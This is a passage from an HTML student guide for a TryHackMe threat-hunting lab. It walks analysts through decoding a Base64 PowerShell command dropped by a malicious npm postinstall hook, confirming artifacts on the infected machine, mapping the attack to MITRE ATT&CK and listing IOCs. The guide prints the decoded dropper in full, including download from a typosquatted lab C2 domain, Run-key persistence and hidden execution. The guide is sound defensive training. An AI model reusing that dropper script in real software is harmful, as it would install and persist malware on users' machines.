    </div>

    <div class="card orange">
      <h3><span class="icon">‚ùì</span> Why Do Attackers Use Base64?</h3>
      <p>There are 3 main reasons:</p>
      <p style="margin-top:12px;"><strong style="color:#fff">1. Bypass text-based detection.</strong> A security tool scanning for <code>Invoke-WebRequest</code> or <code>http://evil.com</code> won't find it inside Base64. The dangerous text is hidden.</p>
      <p><strong style="color:#fff">2. Avoid human inspection.</strong> When a defender looks at logs, a long string of random characters is confusing. Many analysts skip over it, not knowing how to decode it.</p>
      <p><strong style="color:#fff">3. Pass complex commands.</strong> PowerShell's <code>-EncodedCommand</code> flag was actually built by Microsoft to pass commands with special characters. Attackers abuse this legitimate feature.</p>
    </div>

    <div class="card warn">
      <h3><span class="icon">‚ö†Ô∏è</span> Critical: PowerShell Uses UTF-16LE Encoding</h3>
      <p>This is the #1 mistake students make when decoding. PowerShell's <code>-EncodedCommand</code> does NOT use standard UTF-8 Base64. It uses <strong style="color:var(--warn)">UTF-16 Little Endian (UTF-16LE)</strong> encoding.</p>
      <p style="margin-top:10px;">If you just do a plain "Base64 decode" you'll get garbled garbage. You must tell your decoder to interpret the result as UTF-16LE. This is why your output might look like: <code style="color:var(--danger)">J.A.B.c.A...</code> ‚Äî those dots are the null bytes from UTF-16LE that aren't being handled correctly.</p>
    </div>
  </div>
</section>

<!-- DECODE -->
<section id="decode">
  <div class="container">
    <div class="section-header">
      <span class="step-num">STEP 03</span>
      <h2>How to <em>Decode the Command</em></h2>
    </div>
    <div class="divider"></div>

    <p style="color:var(--text-dim); margin-bottom:28px; font-size:14px;">You have two good options. Use whichever feels more comfortable. Both will give you the same result.</p>

    <div class="steps-grid">
      <div class="step-card">
        <div class="step-n">A</div>
        <h4>Option A: Inside the Lab Machine</h4>
        <p>Go to the "My Computer" tab in TryHackMe. Open PowerShell and run the command below. This is the most accurate method because it uses PowerShell itself.</p>
      </div>
      <div class="step-card">
        <div class="step-n">B</div>
        <h4>Option B: CyberChef (Easier)</h4>
        <p>Go to <strong style="color:var(--accent)">cyberchef.org</strong> in your browser. Paste the Base64 string, then use "From Base64" followed by "Decode Text ‚Üí UTF-16LE". Visual and beginner-friendly.</p>
      </div>
    </div>

    <h3 style="font-family:var(--head); font-size:18px; margin:32px 0 16px; color:#fff;">Option A: PowerShell in the Lab Machine (Recommended)</h3>
    <p style="color:var(--text-dim); font-size:14px; margin-bottom:16px;">Copy the full Base64 string from the Splunk event, then open PowerShell in the machine and run this:</p>

    <div class="terminal">
      <div class="terminal-bar">
        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
        <span class="terminal-label">POWERSHELL ‚Äî DECODE COMMAND</span>
      </div>
      <div class="terminal-body">
        <span class="comment"># Step 1: Store the Base64 string in a variable</span><br>
        <span class="prompt">PS&gt;</span> <span class="cmd">$encoded = "JABjAG8AbgBuAGUAYwB0AGkAbwBuAFMAdAByAGkAbgBnAC..."</span><br><br>
        <span class="comment"># Step 2: Decode it using UTF-16LE (the key part!)</span><br>
        <span class="prompt">PS&gt;</span> <span class="cmd">[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))</span><br><br>
        <span class="comment">-- Output will show the full hidden PowerShell script:</span><br><br>
        <span class="decoded">$connectionString = 'http://global-update.wlndows.thm/SystemHealthUpdater.exe'</span><br>
        <span class="decoded">$destination = "$env:APPDATA\SystemHealthUpdater.exe"</span><br>
        <span class="decoded">Invoke-WebRequest -Uri $connectionString -OutFile $destination</span><br>
        <span class="decoded">$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</span><br>
        <span class="decoded">Set-ItemProperty -Path $registryPath -Name "Windows Update Monitor" -Value $destination</span><br>
        <span class="decoded">Start-Process -FilePath $destination -WindowStyle Hidden</span>
      </div>
    </div>

    <h3 style="font-family:var(--head); font-size:18px; margin:32px 0 16px; color:#fff;">Option B: CyberChef Step-by-Step</h3>

    <ol class="splunk-steps">
      <li>
        <strong>Go to cyberchef.org</strong>
        <p>Open your browser and visit <code>https://gchq.github.io/CyberChef/</code></p>
      </li>
      <li>
        <strong>Paste the Base64 string into the "Input" box</strong>
        <p>Copy the full long Base64 string from the Splunk <code>-EncodedCommand</code> argument and paste it into the INPUT box on the right side of CyberChef.</p>
      </li>
      <li>
        <strong>Add the "From Base64" recipe</strong>
        <p>In the Operations search box on the left, search for "From Base64" and drag it into the Recipe area in the middle.</p>
      </li>
      <li>
        <strong>Add "Decode Text" with UTF-16LE</strong>
        <p>Search for "Decode Text" and drag it below "From Base64". In its settings, change the encoding to <strong style="color:var(--warn)">UTF-16LE (1200)</strong>. This is the critical step that handles the null bytes.</p>
      </li>
      <li>
        <strong>Read the Output</strong>
        <p>The Output box will now show the full decoded PowerShell script ‚Äî the hidden malicious commands are revealed!</p>
      </li>
    </ol>

    <h3 style="font-family:var(--head); font-size:18px; margin:32px 0 16px; color:#fff;">What the Decoded Script Tells You</h3>

    <div class="card success">
      <h3><span class="icon">üîç</span> Breaking Down the Decoded Script</h3>
      <div class="terminal" style="margin-top:16px;">
        <div class="terminal-bar">
          <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
          <span class="terminal-label">DECODED POWERSHELL ‚Äî ANNOTATED</span>
        </div>
        <div class="terminal-body">
          <span class="comment"># 1. DOWNLOAD LOCATION ‚Äî This is the C2 server URL</span><br>
          <span class="decoded">$connectionString = 'http://global-update.<span style="color:var(--danger)">wlndows</span>.thm/SystemHealthUpdater.exe'</span><br>
          <span class="comment">                                          ‚Üë TYPOSQUATTED ‚Äî "wlndows" not "windows"!</span><br><br>
          <span class="comment"># 2. DROP LOCATION ‚Äî Hides the malware in a hidden folder</span><br>
          <span class="decoded">$destination = "$env:APPDATA\SystemHealthUpdater.exe"</span><br>
          <span class="comment">                  ‚Üë %APPDATA% is hidden by default. Sneaky.</span><br><br>
          <span class="comment"># 3. DOWNLOAD ‚Äî Uses built-in PowerShell to fetch the malware</span><br>
          <span class="decoded">Invoke-WebRequest -Uri $connectionString -OutFile $destination</span><br><br>
          <span class="comment"># 4. PERSISTENCE ‚Äî Makes malware run on every login</span><br>
          <span class="decoded">Set-ItemProperty -Path <span style="color:var(--warn)">"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</span></span><br>
          <span class="decoded">  -Name <span style="color:var(--warn)">"Windows Update Monitor"</span> -Value $destination</span><br>
          <span class="comment">         ‚Üë Sounds official. Will fool most users.</span><br><br>
          <span class="comment"># 5. EXECUTE ‚Äî Silently launches the malware</span><br>
          <span class="decoded">Start-Process -FilePath $destination -WindowStyle <span style="color:var(--danger)">Hidden</span></span>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- MACHINE -->
<section id="machine">
  <div class="container">
    <div class="section-header">
      <span class="step-num">STEP 04</span>
      <h2>Confirming Artifacts <em>on the Machine</em></h2>
    </div>
    <div class="divider"></div>

    <p style="color:var(--text-dim); margin-bottom:28px; font-size:14px;">After decoding, you need to verify that the attack actually worked on the victim machine. Go to the <strong style="color:#fff">"My Computer" tab</strong> in the TryHackMe simulator to access the remote desktop. Then do the following checks:</p>

    <h3 style="font-family:var(--head); font-size:18px; margin:0 0 16px; color:#fff;">Check 1: Find the Dropped Malware File</h3>

    <div class="terminal">
      <div class="terminal-bar">
        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
        <span class="terminal-label">POWERSHELL ‚Äî CONFIRM MALWARE FILE</span>
      </div>
      <div class="terminal-body">
        <span class="comment"># Navigate to APPDATA and look for the dropped exe</span><br>
        <span class="prompt">PS&gt;</span> <span class="cmd">cd $env:APPDATA</span><br>
        <span class="prompt">PS&gt;</span> <span class="cmd">dir</span><br><br>
        <span class="output">Mode        LastWriteTime     Length  Name</span><br>
        <span class="output">----        -------------     ------  ----</span><br>
        <span class="highlight">-a----      [date/time]       [size]  SystemHealthUpdater.exe  ‚Üê Found it!</span><br><br>
        <span class="comment"># Or navigate via File Explorer to:</span><br>
        <span class="cmd">C:\Users\itadmin-tom\AppData\Roaming\</span><br>
        <span class="comment"># (Note: You may need to enable "Show hidden items" in Explorer)</span>
      </div>
    </div>

    <h3 style="font-family:var(--head); font-size:18px; margin:32px 0 16px; color:#fff;">Check 2: Confirm the Persistence Registry Key</h3>

    <div class="terminal">
      <div class="terminal-bar">
        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
        <span class="terminal-label">POWERSHELL ‚Äî CONFIRM REGISTRY PERSISTENCE</span>
      </div>
      <div class="terminal-body">
        <span class="comment"># Method 1: Using PowerShell</span><br>
        <span class="prompt">PS&gt;</span> <span class="cmd">Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</span><br><br>
        <span class="output">Windows Update Monitor : C:\Users\itadmin-tom\AppData\Roaming\SystemHealthUpdater.exe</span><br>
        <span class="highlight">‚Üë This confirms the persistence entry exists!</span><br><br>
        <span class="comment"># Method 2: Using Registry Editor (GUI)</span><br>
        <span class="cmd">Win + R ‚Üí type "regedit" ‚Üí Navigate to:</span><br>
        <span class="val">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br>
        <span class="comment"># Look for the "Windows Update Monitor" entry on the right panel</span>
      </div>
    </div>

    <div class="infobox success">
      <span class="infobox-icon">‚úÖ</span>
      <div class="infobox-text">
        <strong>Why Confirming Artifacts on Disk Matters</strong>
        <p>Log evidence from Splunk tells you what <em>happened</em>. Checking the actual machine tells you what <em>remains</em>. As an analyst, you need both. Logs can be cleared or tampered with, but if the malicious file is still sitting in <code>%APPDATA%</code> and the registry key is still active, the machine is still compromised ‚Äî right now. Disk confirmation also gives you the file itself, which you can submit to VirusTotal or a sandbox for deeper malware analysis, and extract a hash to use as an additional IOC.</p>
      </div>
    </div>

    <h3 style="font-family:var(--head); font-size:18px; margin:32px 0 16px; color:#fff;">Check 3: Verify the Outbound Network Connection</h3>

    <div class="card orange" style="margin-bottom:20px;">
      <h3><span class="icon">üîé</span> Why Does an Analyst Check Network Connections?</h3>
      <p>Confirming that a file exists on disk is not enough to determine whether an attack is <strong style="color:#fff">active or dormant</strong>. The critical question is: <em style="color:var(--warn)">is this malware currently talking to the attacker?</em></p>
      <p style="margin-top:10px;">When malware calls back to a Command & Control (C2) server, it shows up as an <strong style="color:#fff">established network connection</strong> ‚Äî an open channel between the victim machine and an external IP. As an analyst, checking for active C2 connections tells you three important things:</p>
      <p style="margin-top:10px;"><strong style="color:#fff">1. Is the attacker still in?</strong> An established connection to a suspicious IP means the attacker has live access right now ‚Äî the incident is active, not historical.</p>
      <p><strong style="color:#fff">2. What IP is the attacker using?</strong> The domain <code>wlndows.thm</code> resolves to a real IP address. Identifying that IP is a critical IOC ‚Äî you can share it with your firewall team to block it, and with threat intelligence teams to track the attacker's infrastructure.</p>
      <p><strong style="color:#fff">3. How long has the connection been open?</strong> Duration of a connection can indicate whether data is actively being exfiltrated. A long-lived connection is more suspicious than a brief one.</p>
      <p style="margin-top:10px;">In this lab, even if the malware isn't actively communicating right now, you are training yourself to look for these signals ‚Äî because in a real incident, finding that connection would immediately escalate the severity of the case.</p>
    </div>

    <div class="terminal">
      <div class="terminal-bar">
        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
        <span class="terminal-label">POWERSHELL ‚Äî CHECK NETWORK CONNECTIONS</span>
      </div>
      <div class="terminal-body">
        <span class="comment"># METHOD 1: netstat ‚Äî Lists all active TCP connections with their Process IDs (PIDs)</span><br>
        <span class="comment"># The PID lets you cross-reference which process owns the connection</span><br>
        <span class="prompt">PS&gt;</span> <span class="cmd">netstat -ano | findstr ESTABLISHED</span><br><br>
        <span class="output">  TCP  10.30.x.x:52341  203.0.113.45:443  ESTABLISHED  4892</span><br>
        <span class="comment">             ‚Üë local machine    ‚Üë suspicious external IP        ‚Üë PID ‚Äî check which process this is</span><br><br>
        <span class="comment"># To find which process owns PID 4892:</span><br>
        <span class="prompt">PS&gt;</span> <span class="cmd">Get-Process -Id 4892</span><br>
        <span class="output">  SystemHealthUpdater  ‚Üê this confirms the malware is the one connecting out</span><br><br>
        <span class="comment"># METHOD 2: PowerShell ‚Äî More readable output, shows remote addresses clearly</span><br>
        <span class="prompt">PS&gt;</span> <span class="cmd">Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | Select-Object LocalAddress, RemoteAddress, OwningProcess</span><br><br>
        <span class="comment"># METHOD 3: Hunt in Splunk ‚Äî Search for any log mentioning the C2 domain</span><br>
        <span class="comment"># This finds DNS lookups, HTTP requests, or any other log that contacted the domain</span><br>
        <span class="cmd">index=* wlndows.thm</span><br><br>
        <span class="highlight">‚ö† Any result here is critical ‚Äî it means the machine actively reached out to the attacker's server.</span>
      </div>
    </div>

    <div class="infobox tip">
      <span class="infobox-icon">üß†</span>
      <div class="infobox-text">
        <strong>Analyst Note: The PID is your link between network and process</strong>
        <p><code>netstat -ano</code> gives you the Process ID (PID) of whatever is making each network connection. That PID is how you connect a suspicious outbound connection to the actual malware process running on the machine. Without the PID, you'd see a connection but not know what caused it. With it, you can immediately confirm "the connection is coming from <code>SystemHealthUpdater.exe</code>" ‚Äî which you already know is malware.</p>
      </div>
    </div>
  </div>
</section>

<!-- MITRE -->
<section id="mitre">
  <div class="container">
    <div class="section-header">
      <span class="step-num">STEP 05</span>
      <h2>MITRE ATT&CK <em>Framework Mapping</em></h2>
    </div>
    <div class="divider"></div>

    <div class="card" style="margin-bottom:28px;">
      <h3><span class="icon">üó∫Ô∏è</span> Why Do Analysts Use MITRE ATT&CK?</h3>
      <p>When you investigate an attack, you're generating findings: a suspicious process here, a malicious file there, a weird registry key. The problem is that these findings are just raw observations ‚Äî they don't communicate the <em style="color:var(--accent)">intent</em> or <em style="color:var(--accent)">technique</em> behind them to other people on your team or to management.</p>
      <p style="margin-top:10px;">MITRE ATT&CK is a standardized, globally recognized framework that gives every attacker technique a name and an ID. Instead of saying <em>"there was a PowerShell command that looked encoded,"</em> you write <strong style="color:#fff">T1027.010 ‚Äî Obfuscated Files/Information: Command Obfuscation.</strong> That single code tells another analyst, a SOC manager, or a client's security team exactly what happened ‚Äî instantly, with no ambiguity.</p>
      <p style="margin-top:10px;"><strong style="color:var(--warn)">Why it matters in practice:</strong> MITRE IDs are used in incident reports, threat intelligence sharing (STIX/TAXII), detection rule writing (Sigma, Splunk alerts), and communicating with customers or executives. When you map an attack to ATT&CK, you're translating raw evidence into a language the entire cybersecurity industry speaks. It is also how you identify gaps ‚Äî if you couldn't detect a particular technique, you now know exactly which detection to build next.</p>
    </div>

    <div class="mitre-grid">
      <div class="mitre-card">
        <div class="mitre-id">T1195.001</div>
        <div class="mitre-name">Supply Chain Compromise</div>
        <div class="mitre-desc" style="margin-bottom:10px;">Attacker published malicious <code>healthchk-lib@1.0.1</code> to the npm registry, poisoning a legitimate developer workflow.</div>
        <div style="font-size:11px; color:var(--accent); font-family:var(--mono); letter-spacing:1px;">ANALYST NOTE</div>
        <div style="font-size:12px; color:var(--text-dim); margin-top:4px;">This technique is particularly dangerous because the victim does nothing wrong. Defending against it requires vetting packages before installation, using lockfiles, and monitoring for unexpected npm installs on production or developer machines.</div>
      </div>
      <div class="mitre-card">
        <div class="mitre-id">T1204.002</div>
        <div class="mitre-name">User Execution ‚Äî Malicious File</div>
        <div class="mitre-desc" style="margin-bottom:10px;">Tom ran <code>npm install</code>, which automatically triggered the postinstall hook ‚Äî no user error, just normal developer behavior used against him.</div>
        <div style="font-size:11px; color:var(--accent); font-family:var(--mono); letter-spacing:1px;">ANALYST NOTE</div>
        <div style="font-size:12px; color:var(--text-dim); margin-top:4px;">Attributing this to the user does not mean the user is at fault. It means the attacker relied on a human action to execute the payload ‚Äî as opposed to a fully automated exploit. This distinction matters for the incident narrative.</div>
      </div>
      <div class="mitre-card">
        <div class="mitre-id">T1059.001</div>
        <div class="mitre-name">Command & Scripting ‚Äî PowerShell</div>
        <div class="mitre-desc" style="margin-bottom:10px;">A hidden PowerShell process was spawned using <code>-NoP -W Hidden -EncodedCommand</code> to run the malicious script without any visible window.</div>
        <div style="font-size:11px; color:var(--accent); font-family:var(--mono); letter-spacing:1px;">ANALYST NOTE</div>
        <div style="font-size:12px; color:var(--text-dim); margin-top:4px;">PowerShell is a living-off-the-land tool ‚Äî it's built into Windows, trusted by the OS, and not blocked by default. Attackers love it because using it doesn't require dropping a suspicious third-party executable to run commands.</div>
      </div>
      <div class="mitre-card">
        <div class="mitre-id">T1027.010</div>
        <div class="mitre-name">Obfuscated Files ‚Äî Command Obfuscation</div>
        <div class="mitre-desc" style="margin-bottom:10px;">The PowerShell payload was Base64-encoded so that the actual malicious commands ‚Äî the download URL, the registry write ‚Äî could not be seen in plain text in logs.</div>
        <div style="font-size:11px; color:var(--accent); font-family:var(--mono); letter-spacing:1px;">ANALYST NOTE</div>
        <div style="font-size:12px; color:var(--text-dim); margin-top:4px;">Obfuscation is always a red flag ‚Äî legitimate software has no reason to hide what it's doing. Whenever you see <code>-EncodedCommand</code> combined with <code>-W Hidden</code>, that combination alone is enough to escalate an investigation.</div>
      </div>
      <div class="mitre-card">
        <div class="mitre-id">T1105</div>
        <div class="mitre-name">Ingress Tool Transfer</div>
        <div class="mitre-desc" style="margin-bottom:10px;"><code>Invoke-WebRequest</code> reached out to the attacker's server and downloaded <code>SystemHealthUpdater.exe</code> onto the victim machine.</div>
        <div style="font-size:11px; color:var(--accent); font-family:var(--mono); letter-spacing:1px;">ANALYST NOTE</div>
        <div style="font-size:12px; color:var(--text-dim); margin-top:4px;">This is the moment the attacker moves from <em>running a script</em> to <em>dropping a persistent tool</em> on the machine. Detecting outbound HTTP downloads from PowerShell ‚Äî especially to unknown domains ‚Äî is a high-fidelity detection opportunity.</div>
      </div>
      <div class="mitre-card">
        <div class="mitre-id">T1547.001</div>
        <div class="mitre-name">Boot/Logon ‚Äî Registry Run Keys</div>
        <div class="mitre-desc" style="margin-bottom:10px;">The registry key <code>HKCU\...\CurrentVersion\Run</code> was modified to launch the malware automatically on every user login, named to sound like a system process.</div>
        <div style="font-size:11px; color:var(--accent); font-family:var(--mono); letter-spacing:1px;">ANALYST NOTE</div>
        <div style="font-size:12px; color:var(--text-dim); margin-top:4px;">Run key persistence is one of the most common techniques in malware. The <code>HKCU</code> (current user) hive is especially common because writing to it does not require admin privileges ‚Äî making it accessible even to malware running with standard user rights.</div>
      </div>
    </div>
  </div>
</section>

<!-- IOCs -->
<section id="iocs">
  <div class="container">
    <div class="section-header">
      <span class="step-num">STEP 06</span>
      <h2>All Indicators <em>of Compromise (IOCs)</em></h2>
    </div>
    <div class="divider"></div>

    <div class="card" style="margin-bottom:28px;">
      <h3><span class="icon">üìå</span> What Is an IOC and Why Do Analysts Collect Them?</h3>
      <p>An Indicator of Compromise (IOC) is any artifact ‚Äî a file, a domain name, a registry key, a behavior ‚Äî that provides evidence that a system has been compromised. Think of IOCs as <strong style="color:#fff">the fingerprints left behind by an attacker</strong>.</p>
      <p style="margin-top:10px;">Collecting IOCs is not just about documenting what happened. It serves several critical operational purposes:</p>
      <p style="margin-top:10px;"><strong style="color:#fff">Detection:</strong> Once you have an IOC, you can write detection rules to automatically alert whenever that same artifact appears on any other machine in the organization. A domain name IOC can be fed into your DNS firewall. A file hash can be added to endpoint protection. A registry key path can be monitored by your SIEM.</p>
      <p><strong style="color:#fff">Containment:</strong> IOCs tell your network team what to block immediately. Block the C2 domain at the firewall, quarantine any host that has the malicious file, delete the registry persistence entry.</p>
      <p><strong style="color:#fff">Threat Intelligence Sharing:</strong> Sharing IOCs with other organizations or threat intel platforms (like VirusTotal, MISP, or ISACs) helps the wider community defend against the same attacker ‚Äî even before they are targeted.</p>
      <p style="margin-top:10px;"><strong style="color:var(--warn)">Important:</strong> IOCs have a shelf life. Attackers rotate domains, change file hashes, and modify registry key names. Behavioral IOCs ‚Äî like the abnormal process chain ‚Äî are harder to change and therefore more durable for long-term detection.</p>
    </div>

    <table class="ioc-table">
      <thead>
        <tr>
          <th>Type</th>
          <th>Value</th>
          <th>Category</th>
          <th>Analyst Context ‚Äî Why This Matters</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>npm Package</td>
          <td class="mono-val">healthchk-lib@1.0.1</td>
          <td><span class="tag host">Host</span></td>
          <td>The initial infection vector. Block this package name in your software supply chain policy. Search your entire organization for any other machines that installed it ‚Äî one developer installing it could mean many machines are infected.</td>
        </tr>
        <tr>
          <td>Domain</td>
          <td class="mono-val">global-update.wlndows.thm</td>
          <td><span class="tag network">Network</span></td>
          <td>The attacker's C2 domain. Add it to your DNS blocklist and firewall rules immediately. The typosquatting ("wlndows" vs "windows") is deliberate ‚Äî search for similar variations in your DNS logs, as attackers sometimes register multiple lookalike domains.</td>
        </tr>
        <tr>
          <td>URL</td>
          <td class="mono-val">http://global-update.wlndows.thm/SystemHealthUpdater.exe</td>
          <td><span class="tag network">Network</span></td>
          <td>The exact download path for the malware payload. Block this URL at your web proxy. If you find this URL in your proxy logs on any other machine, that machine has been compromised and must be isolated immediately.</td>
        </tr>
        <tr>
          <td>File</td>
          <td class="mono-val">%APPDATA%\SystemHealthUpdater.exe</td>
          <td><span class="tag host">Host</span></td>
          <td>The dropped malware binary. The <code>%APPDATA%</code> location is significant ‚Äî it's writable without admin rights, and hidden by default, making it a common malware drop location. Create a detection rule to alert on any unsigned executable in <code>%APPDATA%</code>.</td>
        </tr>
        <tr>
          <td>Registry Key</td>
          <td class="mono-val">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</td>
          <td><span class="tag host">Host</span></td>
          <td>The persistence mechanism location. Monitoring writes to <code>CurrentVersion\Run</code> is a standard detection in any mature SOC. New entries here ‚Äî especially ones that don't match known software ‚Äî should always be investigated.</td>
        </tr>
        <tr>
          <td>Registry Value</td>
          <td class="mono-val">Windows Update Monitor</td>
          <td><span class="tag host">Host</span></td>
          <td>The name chosen by the attacker to blend in. Attackers deliberately choose names that sound like legitimate Windows processes. Always cross-reference registry run values against a known-good baseline ‚Äî if you can't verify it was put there by a known installer, treat it as suspicious.</td>
        </tr>
        <tr>
          <td>Script</td>
          <td class="mono-val">postinstall.ps1</td>
          <td><span class="tag host">Host</span></td>
          <td>The execution trigger buried inside the npm package. Any npm package with a <code>postinstall</code> script should be considered high-risk and reviewed before running. This is the attacker's foothold ‚Äî everything downstream flows from this script executing.</td>
        </tr>
        <tr>
          <td>Behavior</td>
          <td class="mono-val">-NoP -W Hidden -EncodedCommand</td>
          <td><span class="tag behavior">Behavior</span></td>
          <td>This combination of PowerShell flags is a high-confidence signal of malicious intent. <code>-NoP</code> bypasses PowerShell execution policies. <code>-W Hidden</code> hides the window from the user. <code>-EncodedCommand</code> conceals the actual payload. Legitimate software almost never uses all three together ‚Äî alerting on this combination will catch a wide range of real-world attacks.</td>
        </tr>
        <tr>
          <td>Process Chain</td>
          <td class="mono-val">node.exe ‚Üí cmd.exe ‚Üí powershell.exe</td>
          <td><span class="tag behavior">Behavior</span></td>
          <td>This is a behavioral IOC ‚Äî the most durable type. Process lineage (who spawned who) is very hard for attackers to change because it's determined by how the attack chain operates. A web server, npm, or any interpreter spawning <code>cmd.exe</code> then <code>powershell.exe</code> is a well-known malicious pattern and should be in every SIEM's detection ruleset.</td>
        </tr>
      </tbody>
    </table>
  </div>
</section>

<!-- CHECKLIST -->
<section id="checklist">
  <div class="container">
    <div class="section-header">
      <span class="step-num">FINAL</span>
      <h2>Lab <em>Completion Checklist</em></h2>
    </div>
    <div class="divider"></div>

    <div class="card">
      <h3><span class="icon">üìã</span> Everything You Should Have Found</h3>
      <ul class="checklist">
        <li class="done"><span class="check-box">‚úì</span> Opened Splunk and searched for "npm" across all logs</li>
        <li class="done"><span class="check-box">‚úì</span> Found Tom's npm install event for <code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2c44494d4058444f44470140454e6c1d021c021d">[email&#160;protected]</a></code></li>
        <li class="done"><span class="check-box">‚úì</span> Identified the abnormal process chain: node.exe ‚Üí cmd.exe ‚Üí powershell.exe</li>
        <li class="done"><span class="check-box">‚úì</span> Located the Base64-encoded <code>-EncodedCommand</code> in the PowerShell event</li>
        <li class="done"><span class="check-box">‚úì</span> Decoded the Base64 string using PowerShell or CyberChef (with UTF-16LE)</li>
        <li class="done"><span class="check-box">‚úì</span> Identified the malicious download URL: <code>global-update.wlndows.thm</code></li>
        <li class="done"><span class="check-box">‚úì</span> Found the malware file in <code>%APPDATA%\SystemHealthUpdater.exe</code></li>
        <li class="done"><span class="check-box">‚úì</span> Confirmed the persistence registry key "Windows Update Monitor"</li>
        <li class="done"><span class="check-box">‚úì</span> Listed all IOCs for the scenario report</li>
        <li class="done"><span class="check-box">‚úì</span> Mapped the attack to MITRE ATT&CK techniques</li>
      </ul>
    </div>

    <div class="infobox tip" style="margin-top:24px;">
      <span class="infobox-icon">üéØ</span>
      <div class="infobox-text">
        <strong>Key Lesson from This Lab</strong>
        <p>A single npm install by a developer ‚Äî doing completely normal work ‚Äî was enough to compromise a machine. No phishing, no exploit, no suspicious email. This is why <strong>supply chain security</strong> matters: developers must vet every package they install, use package lock files, and audit dependencies. Security teams must hunt for malicious post-install scripts and obfuscated PowerShell in their logs.</p>
      </div>
    </div>

    <div style="margin-top: 40px; padding: 28px; background: var(--panel); border: 1px solid var(--border); border-radius: 4px; text-align:center;">
      <div style="font-family:var(--head); font-size:28px; color: var(--accent3); margin-bottom:8px;">üéâ Investigation Complete</div>
      <p style="color:var(--text-dim); font-size:14px;">You have successfully traced a supply chain attack from initial access through persistence. You decoded obfuscated malware and confirmed artifacts on the victim machine. Well done.</p>
    </div>
  </div>
</section>

<footer class="footer">
  <div class="container">
    <span>// HEALTH HAZARD</span> ¬∑ TryHackMe Threat Hunting Simulator ¬∑ Student Guide
    <br><br>
    <span style="font-size:13px; color:var(--accent);">CC7007 ¬∑ Week 2</span> &nbsp;¬∑&nbsp; <span style="font-size:13px; color:#fff;">Fatma Yasmine Loumachi</span>
    <br><br>
    <span style="font-size:11px; color:#2a4a5a;">Intended for educational use in cybersecurity training environments only.</span>
  </div>
</footer>

</body>
</html>
